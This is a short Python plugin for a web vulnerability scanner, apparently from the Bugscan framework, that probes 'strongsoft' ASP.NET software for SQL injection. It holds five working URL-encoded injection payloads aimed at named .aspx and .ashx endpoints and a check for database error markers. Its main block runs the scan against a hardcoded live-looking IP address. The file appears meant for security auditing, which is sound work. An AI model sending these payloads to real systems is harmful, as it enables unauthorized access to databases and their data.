#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0108828
#refer:http://www.wooyun.org/bugs/wooyun-2010-0108604

import time

def assign(service, arg):
    if service == "strongsoft":
        return True, arg
        
        
        
def audit(arg): 
    x = arg[7:-1]
    cookie = 'Cookie: ASP.NET_SessionId=dlsnv245vsnx1s45vhajsx45; UserId'+x+'=guest' 
    payloads=[
        'DefaultLeftMenu.aspx?MenuId=1%27%20and%20db_name%281%29%3E1--',
        'DefaultLeftMenu.aspx?MenuId=1%27%20and%20db_name(1)%3E1--',
        'SystemManage/SysGeneral/SysGeneralShow.aspx?MenuId=1%20and%20db_name%281%29%3E1--',
        'Warn/AjaxHandle/AjaxDeleteMsgInfo.ashx?action=DeleteMsg&msgid=%28CONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28106%29%2bCHAR%28113%29%2b%28SELECT%20%28CASE%20WHEN%20%289134%3D9134%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2bCHAR%28113%29%2bCHAR%28113%29%2bCHAR%28118%29%2bCHAR%28118%29%2bCHAR%28113%29%29%29%29',
        'Duty/write/FileType.aspx?hideBtn=1&ID=1%27%2bdb_name(1)%2b%27'
        ]
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url,cookie = cookie)
        if code == 500 and 'master' in res or 'qqpjq1qqvvq' in res :
            security_hole(url + "   :sql Injection")







if __name__ == '__main__': 
    from dummy import * 
    audit(assign('strongsoft', 'http://61.153.79.222:3050/')[1])